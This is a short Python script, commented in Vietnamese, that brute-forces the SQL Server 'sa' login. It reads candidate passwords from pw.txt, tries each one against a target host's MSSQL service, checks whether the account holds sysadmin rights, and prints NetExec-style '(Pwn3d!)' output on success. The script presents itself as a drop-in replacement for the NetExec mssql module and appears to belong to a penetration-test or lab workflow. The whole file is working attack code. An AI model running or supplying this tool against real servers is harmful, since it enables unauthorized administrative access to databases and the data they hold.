"""Nhanh A: brute-force sa (thay `nxc mssql -u sa -p pw.txt` khi chua co NetExec).
Doc pw.txt, thu login TDS 1433. Tai khoan dung se co quyen sysadmin.
Dung: python brute_sa.py [host]  (mac dinh localhost)
"""
import sys
import pymssql

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"

with open("pw.txt", encoding="utf-8") as f:
    candidates = [x.strip() for x in f if x.strip()]

for pw in candidates:
    try:
        cn = pymssql.connect(server=host, user="sa", password=pw, database="master", login_timeout=5)
        cur = cn.cursor()
        cur.execute("SELECT IS_SRVROLEMEMBER('sysadmin')")
        is_admin = cur.fetchone()[0]
        print(f"[+] {host}\\sa:{pw} (sysadmin={is_admin}) (Pwn3d!)" if is_admin else f"[+] {host}\\sa:{pw}")
        cn.close()
        break
    except Exception as e:
        print(f"[-] sa:{pw} -> {str(e)[:100]}")
else:
    print("[-] Khong tim thay mat khau trong pw.txt")
